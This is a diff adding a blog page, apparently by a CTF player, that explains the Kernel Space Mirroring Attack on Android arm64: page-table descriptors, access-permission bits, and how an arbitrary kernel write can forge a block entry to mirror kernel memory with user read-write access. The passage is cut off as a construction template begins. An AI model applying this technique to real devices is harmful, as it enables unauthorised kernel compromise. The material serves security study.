@@ -1,0 +1,1048 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <meta name="keywords" content="Hexo Theme Redefine">
+    
+    <meta name="author" content="henry">
+    <!-- preconnect -->
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+
+    
+    <!--- Seo Part-->
+    
+    <link rel="canonical" href="http://example.com/2025/02/10/ksma/"/>
+    <meta name="robots" content="index,follow">
+    <meta name="googlebot" content="index,follow">
+    <meta name="revisit-after" content="1 days">
+    
+        <meta name="description" content="Reference： blackhat：https:&#x2F;&#x2F;i.blackhat.com&#x2F;briefings&#x2F;asia&#x2F;2018&#x2F;asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf  ARM v8手册：https:&#x2F;&#x2F;developer.arm.com&#x2F;documentati">
+<meta property="og:type" content="article">
+<meta property="og:title" content="KSMA - Kernel Space Mirroring Attack">
+<meta property="og:url" content="http://example.com/2025/02/10/KSMA/index.html">
+<meta property="og:site_name" content="Hexo">
+<meta property="og:description" content="Reference： blackhat：https:&#x2F;&#x2F;i.blackhat.com&#x2F;briefings&#x2F;asia&#x2F;2018&#x2F;asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf  ARM v8手册：https:&#x2F;&#x2F;developer.arm.com&#x2F;documentati">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_14-56-13.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_14-58-10.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-13-55.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-20-44.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-24-53.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-27-43.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-30-59.png">
+<meta property="og:image" content="http://example.com/images/Snipaste_2024-11-26_15-40-14.png">
+<meta property="article:published_time" content="2025-02-10T13:42:44.687Z">
+<meta property="article:modified_time" content="2025-02-10T13:46:28.280Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="netlink">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Snipaste_2024-11-26_14-56-13.png">
+    
+    
+    <!--- Icon Part-->
+    <link rel="icon" type="image/png" href="/images/icon.png" sizes="192x192">
+    <link rel="apple-touch-icon" sizes="180x180" href="/images/icon.png">
+    <meta name="theme-color" content="#A31F34">
+    <link rel="shortcut icon" href="/images/icon.png">
+    <!--- Page Info-->
+    
+    <title>
+        
+            KSMA - Kernel Space Mirroring Attack -
+        
+        Henry Martin
+    </title>
+    
+<link rel="stylesheet" href="/css/style.css">
+
+
+    
+        
+<link rel="stylesheet" href="/assets/build/styles.css">
+
+    
+
+    
+<link rel="stylesheet" href="/fonts/fonts.css">
+
+    
+<link rel="stylesheet" href="/fonts/Satoshi/satoshi.css">
+
+    
+<link rel="stylesheet" href="/fonts/Chillax/chillax.css">
+
+    <!--- Font Part-->
+    
+    
+    
+    
+
+    <!--- Inject Part-->
+    
+    <script id="hexo-configurations">
+    window.config = {"hostname":"example.com","root":"/","language":"en"};
+    window.theme = {"articles":{"style":{"font_size":"16px","line_height":1.5,"image_border_radius":"14px","image_alignment":"center","image_caption":false,"link_icon":true,"title_alignment":"left"},"word_count":{"enable":true,"count":true,"min2read":true},"author_label":{"enable":true,"auto":false,"list":[]},"code_block":{"copy":true,"style":"mac","font":{"enable":false,"family":null,"url":null}},"toc":{"enable":true,"max_depth":3,"number":false,"expand":true,"init_open":true},"copyright":{"enable":true,"default":"cc_by_nc_sa"},"lazyload":true,"recommendation":{"enable":false,"title":"推荐阅读","limit":3,"mobile_limit":2,"placeholder":"/images/wallhaven-wqery6-light.webp","skip_dirs":[]}},"colors":{"primary":"#A31F34","secondary":null},"global":{"fonts":{"chinese":{"enable":false,"family":null,"url":null},"english":{"enable":false,"family":null,"url":null}},"content_max_width":"1000px","sidebar_width":"210px","hover":{"shadow":true,"scale":false},"scroll_progress":{"bar":false,"percentage":true},"website_counter":{"url":"https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js","enable":true,"site_pv":true,"site_uv":true,"post_pv":true},"single_page":true,"open_graph":true,"google_analytics":{"enable":false,"id":null}},"home_banner":{"enable":true,"style":"fixed","image":{"light":"/images/wallhaven-we3z86.webp","dark":"/images/wallhaven-6degr6.webp"},"title":"Welcome To Henry's Blog","subtitle":{"text":["a pwner from polaris"],"hitokoto":{"enable":false,"api":"https://v1.hitokoto.cn"},"typing_speed":100,"backing_speed":80,"starting_delay":500,"backing_delay":1500,"loop":true,"smart_backspace":true},"text_color":{"light":"#fff","dark":"#d1d1b6"},"text_style":{"title_size":"2.8rem","subtitle_size":"1.5rem","line_height":1.2},"custom_font":{"enable":false,"family":null,"url":null},"social_links":{"enable":true,"links":{"github":"https://github.com/henrymartin262","instagram":"https://instagram.com","zhihu":"https://www.zhihu.com/","twitter":"https://twitter.com","email":"1551022913@qq.cmo"},"qrs":{"weixin":null}}},"plugins":{"feed":{"enable":false},"aplayer":{"enable":true,"type":"fixed","audios":[{"name":"Something Just Like This","artist":"Coldplay","url":"https://evan.beee.top/music/Something%20Just%20Like%20This%20-%20The%20Chainsmokers%E3%80%81Coldplay.mp3","cover":"https://evan.beee.top/music/covers/Something_Just_Like_This.png"}]},"mermaid":{"enable":false,"version":"9.3.0"}},"version":"2.5.6","navbar":{"auto_hide":false,"color":{"left":"#f78736","right":"#367df7","transparency":35},"links":{"Home":{"path":"/","icon":"fa-regular fa-house"},"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Categories":{"path":"/categories/","icon":"fa-regular fa-folder"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"About":{"icon":"fa-regular fa-user","submenus":{"Links":"/links/","Github":"https://github.com/henrymartin262","Blog":"https://henrymartin262.github.io"}}},"search":{"enable":false,"preload":true}},"page_templates":{"friends_column":2,"tags_style":"blur"},"home":{"sidebar":{"enable":true,"position":"left","first_item":"menu","announcement":null,"links":{"Archives":{"path":"/archives","icon":"fa-regular fa-archive"},"Tags":{"path":"/tags","icon":"fa-regular fa-tags"},"Categories":{"path":"/categories","icon":"fa-regular fa-folder"}}},"article_date_format":"auto","categories":{"enable":true,"limit":3},"tags":{"enable":true,"limit":3}},"footerStart":"2023/11/24 11:45:14"};
+    window.lang_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"};
+    window.data = {"masonry":false};
+  </script>
+    
+    <!--- Fontawesome Part-->
+    
+<link rel="stylesheet" href="/fontawesome/fontawesome.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/brands.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/solid.min.css">
+
+    
+<link rel="stylesheet" href="/fontawesome/regular.min.css">
+
+    
+    
+    
+    
+<meta name="generator" content="Hexo 7.0.0"><style>mjx-container[jax="SVG"] {
+  direction: ltr;
+}
+
+mjx-container[jax="SVG"] > svg {
+  overflow: visible;
+}
+
+mjx-container[jax="SVG"][display="true"] {
+  display: block;
+  text-align: center;
+  margin: 1em 0;
+}
+
+mjx-container[jax="SVG"][justify="left"] {
+  text-align: left;
+}
+
+mjx-container[jax="SVG"][justify="right"] {
+  text-align: right;
+}
+
+g[data-mml-node="merror"] > g {
+  fill: red;
+  stroke: red;
+}
+
+g[data-mml-node="merror"] > rect[data-background] {
+  fill: yellow;
+  stroke: none;
+}
+
+g[data-mml-node="mtable"] > line[data-line] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > rect[data-frame] {
+  stroke-width: 70px;
+  fill: none;
+}
+
+g[data-mml-node="mtable"] > .mjx-dashed {
+  stroke-dasharray: 140;
+}
+
+g[data-mml-node="mtable"] > .mjx-dotted {
+  stroke-linecap: round;
+  stroke-dasharray: 0,140;
+}
+
+g[data-mml-node="mtable"] > svg {
+  overflow: visible;
+}
+
+[jax="SVG"] mjx-tool {
+  display: inline-block;
+  position: relative;
+  width: 0;
+  height: 0;
+}
+
+[jax="SVG"] mjx-tool > mjx-tip {
+  position: absolute;
+  top: 0;
+  left: 0;
+}
+
+mjx-tool > mjx-tip {
+  display: inline-block;
+  padding: .2em;
+  border: 1px solid #888;
+  font-size: 70%;
+  background-color: #F8F8F8;
+  color: black;
+  box-shadow: 2px 2px 5px #AAAAAA;
+}
+
+g[data-mml-node="maction"][data-toggle] {
+  cursor: pointer;
+}
+
+mjx-status {
+  display: block;
+  position: fixed;
+  left: 1em;
+  bottom: 1em;
+  min-width: 25%;
+  padding: .2em .4em;
+  border: 1px solid #888;
+  font-size: 90%;
+  background-color: #F8F8F8;
+  color: black;
+}
+
+foreignObject[data-mjx-xml] {
+  font-family: initial;
+  line-height: normal;
+  overflow: visible;
+}
+
+.MathJax path {
+  stroke-width: 3;
+}
+
+mjx-container[display="true"] {
+  overflow: auto hidden;
+}
+
+mjx-container[display="true"] + br {
+  display: none;
+}
+</style></head>
+
+
+<body>
+<div class="progress-bar-container">
+    
+
+    
+        <span class="pjax-progress-bar"></span>
+        <span class="swup-progress-icon">
+            <i class="fa-solid fa-circle-notch fa-spin"></i>
+        </span>
+    
+</div>
+
+
+<main class="page-container" id="swup">
+
+    
+
+    <div class="main-content-container">
+
+
+        <div class="main-content-header">
+            <header class="navbar-container">
+    
+    <div class="navbar-content">
+        <div class="left">
+            
+            <a class="logo-title" href="/">
+                
+                Henry Martin
+                
+            </a>
+        </div>
+
+        <div class="right">
+            <!-- PC -->
+            <div class="desktop">
+                <ul class="navbar-list">
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-house"></i>
+                                        
+                                        HOME
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/archives"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-archive"></i>
+                                        
+                                        ARCHIVES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/categories/"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-folder"></i>
+                                        
+                                        CATEGORIES
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="" 
+                                    href="/tags"  >
+                                    
+                                        
+                                            <i class="fa-regular fa-tags"></i>
+                                        
+                                        TAGS
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                            </li>
+                    
+                        
+                            <li class="navbar-item">
+                                <!-- Menu -->
+                                <a class="has-dropdown" 
+                                    href="#" onClick="return false;">
+                                    
+                                        
+                                            <i class="fa-regular fa-user"></i>
+                                        
+                                        ABOUT&nbsp;<i class="fa-solid fa-chevron-down"></i>
+                                    
+                                </a>
+                                <!-- Submenu -->
+                                
+                                    <ul class="sub-menu">
+                                    
+                                        <li>
+                                        <a href="/links/">LINKS
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB
+                                        </a>
+                                        </li>
+                                    
+                                        <li>
+                                        <a target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG
+                                        </a>
+                                        </li>
+                                    
+                                    </ul>
+                                
+                            </li>
+                    
+                    
+                </ul>
+            </div>
+            <!-- Mobile -->
+            <div class="mobile">
+                
+                <div class="icon-item navbar-bar">
+                    <div class="navbar-bar-middle"></div>
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <!-- Mobile drawer -->
+    <div class="navbar-drawer w-full absolute top-0 left-0 bg-background-color">
+        <ul class="drawer-navbar-list flex flex-col justify-start items-center">
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/"  >
+                             
+                                
+                                    <i class="fa-regular fa-house"></i>
+                                
+                                HOME
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/archives"  >
+                             
+                                
+                                    <i class="fa-regular fa-archive"></i>
+                                
+                                ARCHIVES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/categories/"  >
+                             
+                                
+                                    <i class="fa-regular fa-folder"></i>
+                                
+                                CATEGORIES
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group " 
+                        href="/tags"  >
+                             
+                                
+                                    <i class="fa-regular fa-tags"></i>
+                                
+                                TAGS
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                    
+            
+                
+                    <li class="drawer-navbar-item text-base my-1.5 flex justify-center items-center">
+                        <a class="rounded-3xl py-1.5 px-5 hover:border hover:!text-primary active:!text-primary group has-dropdown" 
+                        href="#" onClick="return false;">
+                            
+                                
+                                    <i class="fa-regular fa-user"></i>
+                                
+                                ABOUT&nbsp;<i class="group-hover:rotate-180 transition-transform fa-solid fa-chevron-down"></i>
+                            
+                        </a>
+                    </li>
+                    <!-- Submenu -->
+                              
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" href="/links/">LINKS</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://github.com/henrymartin262">GITHUB</a>
+                            </li>
+                        
+                            <li class="drawer-navbar-item text-base flex justify-center items-center hover:underline active:underline hover:underline-offset-1 rounded-3xl">
+                                <a class="py-0.5" target="_blank" rel="noopener" href="https://henrymartin262.github.io">BLOG</a>
+                            </li>
+                        
+                    
+            
+
+        </ul>
+    </div>
+
+    <div class="window-mask"></div>
+
+</header>
+
+
+        </div>
+
+        <div class="main-content-body">
+
+            
+
+            <div class="main-content">
+
+                
+                    <div class="post-page-container">
+    <div class="article-content-container">
+
+        <div class="article-title relative w-full">
+            
+                
+                
+                <img src="/images/Snipaste_2024-11-26_15-13-55.png" alt="KSMA - Kernel Space Mirroring Attack" class="w-full h-60 sm:h-72 md:h-80 object-cover sm:rounded-t-large dark:brightness-75"/>
+                
+                <div class="w-full flex items-center absolute bottom-0 justify-start">
+                    <h1 class="article-title-cover text-center mx-6 my-6 text-second-text-color bg-background-color-transparent px-4 py-3 text-3xl sm:text-4xl md:text-5xl font-bold backdrop-blur-lg rounded-xl border border-border-color ">KSMA - Kernel Space Mirroring Attack</h1>
+                </div>
+            
+            </div>
+
+        
+            <div class="article-header flex flex-row gap-2 items-center px-2 sm:px-6 md:px-8">
+                <div class="avatar w-[46px] h-[46px] flex-shrink-0 rounded-medium border border-border-color p-[1px]">
+                    <img src="/images/henry.png">
+                </div>
+                <div class="info flex flex-col justify-between">
+                    <div class="author flex items-center">
+                        <span class="name text-default-text-color text-lg font-semibold">henry</span>
+                        
+                            <span class="author-label ml-1.5 text-xs px-2 py-0.5 rounded-small text-third-text-color border border-shadow-color-1">Lv4</span>
+                        
+                    </div>
+                    <div class="meta-info">
+                        <div class="article-meta-info">
+    <span class="article-date article-meta-item">
+        <i class="fa-regular fa-pen-fancy"></i>&nbsp;
+        <span class="desktop">2025-02-10 21:42:44</span>
+        <span class="mobile">2025-02-10 21:42:44</span>
+        <span class="hover-info">Created</span>
+    </span>
+    
+        <span class="article-date article-meta-item">
+            <i class="fa-regular fa-wrench"></i>&nbsp;
+            <span class="desktop">2025-02-10 21:46:28</span>
+            <span class="mobile">2025-02-10 21:46:28</span>
+            <span class="hover-info">Updated</span>
+        </span>
+    
+
+    
+        <span class="article-categories article-meta-item">
+            <i class="fa-regular fa-folders"></i>&nbsp;
+            <ul>
+                
+                
+                    
+                        
+                        <li>
+                            <a href="/categories/Android/">Android</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Android/kernel-attack/">kernel attack</a>&nbsp;
+                        </li>
+                    
+                    
+                
+                    
+                        
+                            <li>></li>
+                        
+                        <li>
+                            <a href="/categories/Android/kernel-attack/KSMA/">KSMA</a>&nbsp;
+                        </li>
+                    
+                    
+                
+            </ul>
+        </span>
+    
+    
+        <span class="article-tags article-meta-item">
+            <i class="fa-regular fa-tags"></i>&nbsp;
+            <ul>
+                
+                    <li>
+                        <a href="/tags/netlink/">netlink</a>&nbsp;
+                    </li>
+                
+            </ul>
+        </span>
+    
+
+    
+    
+    
+    
+        <span class="article-pv article-meta-item">
+            <i class="fa-regular fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
+        </span>
+    
+</div>
+
+                    </div>
+                </div>
+            </div>
+        
+
+        
+
+
+        <div class="article-content markdown-body px-2 sm:px-6 md:px-8 pb-8">
+            <p><strong>Reference：</strong></p>
+<p>blackhat：<a class="link" target="_blank" rel="noopener" href="https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf">https://i.blackhat.com/briefings/asia/2018/asia-18-WANG-KSMA-Breaking-Android-kernel-isolation-and-Rooting-with-ARM-MMU-features.pdf <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>ARM v8手册：<a class="link" target="_blank" rel="noopener" href="https://developer.arm.com/documentation/ddi0487/aa/?lang=en">https://developer.arm.com/documentation/ddi0487/aa/?lang=en <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<p>USMA介绍：<a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/116776496">https://zhuanlan.zhihu.com/p/116776496 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
+<h1 id="KSMA"><a href="#KSMA" class="headerlink" title="KSMA"></a>KSMA</h1><p>KSMA 即 Kernel Space Mirroring Attack</p>
+<h2 id="linux-page-table-layout"><a href="#linux-page-table-layout" class="headerlink" title="linux page table layout"></a>linux page table layout</h2><p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_14-56-13.png" alt="Snipaste_2024-11-26_14-56-13"></p>
+<p>上图给的是一个三级页表的目录布局，具体采用几级目录取决于目标系统以及架构。</p>
+<p>对于Android来说仅使用39bit作为虚拟地址，下图为page大小为4KB，给定一个<code>input address</code>到最后获取物理地址(physical addr)的完成过程。（下面这部分内容具体信息可见ARMv8手册中的 D5.4 VMSAv8-64 translation table format descriptors）</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_14-58-10.png" alt="Snipaste_2024-11-26_14-58-10"></p>
+<p>需要说明的是内核与用户态进程使用的不是同一份页表，内核拥有自己单独的页表，内核线程共享，用户态进程分别拥有自己的页表。</p>
+<p>内核页表在内核初始化时静态创建，如下 <code>init_mm</code>。pgd 指向 <code>swapper_pg_dir</code>，在没有 KASLR 的情况下，该全局变量是一个固定值 <code>0xffffffc00007d000</code>，所以内核一级页表位于固定内存位置</p>
+<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">mm_struct</span> <span class="title">init_mm</span> =</span> {</span><br><span class="line">  .mm_rb = RB_ROOT,</span><br><span class="line">  .pgd = swapper_pg_dir,</span><br><span class="line">  .mm_users = ATOMIC_INIT(<span class="number">2</span>),</span><br><span class="line">  .mm_count = ATOMIC_INIT(<span class="number">1</span>),</span><br><span class="line">  .mmap_sem = __RWSEM_INITIALIZER(init_mm.mmap_sem),</span><br><span class="line">  .page_table_lock = __SPIN_LOCK_UNLOCKED(init_mm.page_table_lock),</span><br><span class="line">  .mmlist = LIST_HEAD_INIT(init_mm.mmlist),</span><br><span class="line">  INIT_MM_CONTEXT(init_mm)</span><br><span class="line">};</span><br></pre></td></tr></table></figure></div>
+
+<p>这里简单介绍一下TTBR的概念</p>
+<p><strong>1. TTBR（Translation Table Base Register）简介</strong></p>
+<p>TTBR 是 ARM 架构中的页表基址寄存器，用于存储页表的起始地址。它有两个寄存器：</p>
+<p>​	•	<strong>TTBR0</strong>：通常用于管理 <strong>用户态（User Space）</strong> 地址的页表。</p>
+<p>​	•	<strong>TTBR1</strong>：通常用于管理 <strong>内核态（Kernel Space）</strong> 地址的页表。</p>
+<p><strong>2. TTBR 的地址空间范围</strong></p>
+<p><strong>TTBR0 - User Address（用户地址范围）：</strong></p>
+<p>​	•	范围：0x0000_0000_0000_0000 ~ 0x0000_007F_FFFF_FFFF。</p>
+<p>​	•	这部分地址空间属于 <strong>用户态</strong>（EL0），即普通应用程序的虚拟地址范围。</p>
+<p>​	•	使用 <strong>TTBR0</strong> 指定的页表进行地址翻译。</p>
+<p><strong>TTBR1 - Kernel Address（内核地址范围）：</strong></p>
+<p>​	•	范围：0xFFFF_FF80_0000_0000 ~ 0xFFFF_FFFF_FFFF_FFFF。</p>
+<p>​	•	这部分地址空间属于 <strong>内核态</strong>（EL1），即操作系统内核的虚拟地址范围。</p>
+<p>​	•	使用 <strong>TTBR1</strong> 指定的页表进行地址翻译。</p>
+<p>在实际过程中，页描述符的格式也有所不同，具体分为以下几类：</p>
+<ul>
+<li>一个无效或者缺页条目</li>
+<li>一个页表条目（table entry），用来指向下一级页表的位置</li>
+<li>一个块条目（block entry）,用来指向一个块内存，同时也会定义该块内存的访问属性</li>
+<li>保留格式</li>
+</ul>
+<p>值得注意的是<code>table entry</code> 和 <code>block entry</code></p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-13-55.png" alt="Snipaste_2024-11-26_15-13-55"></p>
+<p>如上图所示，展示了在 0级（在android中不使用该地址区间，所以无效），1级，2级目录下的<code>block entry</code> 和 <code>table entry</code>之间的格式区别，<code>Bit[1] == 0</code> 代表这是一个 <code>block entry</code>，同样的<code>Bit[1] == 1</code> 代表了这是一个<code>table entry</code>。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-20-44.png" alt="Snipaste_2024-11-26_15-20-44"></p>
+<p>三级目录下的<code>table entry</code>格式如上图所示，这时候就不存在<code>block entry</code>一说了，综上Android实际page table工作流程如下：</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-24-53.png" alt="Snipaste_2024-11-26_15-24-53"></p>
+<p>在page大小为4KB的情况下，一级目录中的<code>block entry</code>将会指向一个 1GB 大小的空间，二级目录中的<code>block entry</code>将会指向一个<code>2MB</code>大小的空间。</p>
+<p>现在我们来只专注于<code>block entry</code>的情况，不考虑<code>output address</code> 的区间，其它区间的字段内容如下：</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-27-43.png" alt="Snipaste_2024-11-26_15-27-43"></p>
+<p>其中<code>PXN</code>标识该条目指向的地址是否可执行，<code>AP[2:1]</code>标识访问权限，具体细节见下图：</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-30-59.png" alt="Snipaste_2024-11-26_15-30-59"></p>
+<p>当<code>AP[2:1]== 0b01</code>时，用户态（EL0）也将拥有该地址的RW权限，试想如果我们有一次任意写的机会，可以用来改写对应的页表条目，将其构造为<code>block entry</code>，其中的<code>output address</code>可以设置为我们想要映射的物理内存地址，在android中，内核镜像在物理内存中的位置是固定的，然后实现对内核镜像的代码片段的修改，简单来说通过在内核地址空间中创建一块类似对应物理内存的镜像，直接实现了对任意物理内存的读写。</p>
+<p>如何理解这个镜像呢，实际上就是将一块物理内存映射到了另外一块虚拟地址空间中，两种从不同虚拟地址的读写操作，都会影响对应物理内存的变化。</p>
+<p><img lazyload="" src="/images/loading.svg" data-src="/images/Snipaste_2024-11-26_15-40-14.png" alt="Snipaste_2024-11-26_15-40-14"></p>
+<p>在这张图中就是如此，通过构造一个<code>D_Block</code>使地址<code>FFFFFFC230002000</code>与<code>FFFFFFC030002000</code>指向了同一块物理内存，但是对于<code>FFFFFFC230002000</code> 来说我们直接拥有可读写权限，至此就完成了 KSMA 的利用。</p>
+<p>具体使用方法：</p>
+<blockquote>
+<p>摘自Reference 3</p>
+<p>首先确定伪造的 d_block 描述符应该在内存什么位置。该内存位置是可以计算出来的。内核 VA 中有很多的地址空间是没有被使用的，准确的说，没有被映射过。这些内存空洞就可以用来重新映射内核镜像 PA。不考虑 KASLR 的情形，内核镜像加载的起始地址一般为 0xffffffc000000000，镜像大小 1Gb<br>（0x40000000 Byte） 左右。0xffffffc200000000 开始的区域通常为内存空洞区域，我们可以将该地址开始的 1Gb 空间，作为再次映射内核 PA 的 VA。当然也是可以采用其他区域的，比如 0xffffffc300000000 开始的 VA，这里以 0xffffffc200000000 作为示例</p>
+</blockquote>
+<h2 id="block-entry构造模版"><a href="#block-entry构造模版" class="headerlink" title="block entry构造模版"></a>block entry构造模版</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_OFFSEST 0xffffffc000000000</span></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">*</span></span><br><span class="line"><span class="comment">Android arm64 Translation table lookup with 4KB pages:</span></span><br><span class="line"><span class="comment">+--------+--------+--------+--------+--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment">|63 56|55 48|47 40|39 32|31 24|23 16|15 8|7 0|</span></span><br><span class="line"><span class="comment">+--------+--------+--------+--------+--------+--------+--------+--------+</span></span><br><span class="line"><span class="comment">| | | | | |</span></span><br><span class="line"><span class="comment">| | | | | v</span></span><br><span class="line"><span class="comment">| | | | | [11:0] in-page offset</span></span><br><span class="line"><span class="comment">| | | | +-&gt; [20:12] L3 index</span></span><br><span class="line"><span class="comment">| | | +-----------&gt; [29:21] L2 index</span></span><br><span class="line"><span class="comment">| | +---------------------&gt; [38:30] L1 index</span></span><br><span class="line"><span class="comment">| +-------------------------------&gt; [47:39] L0 index (not used)</span></span><br><span class="line"><span 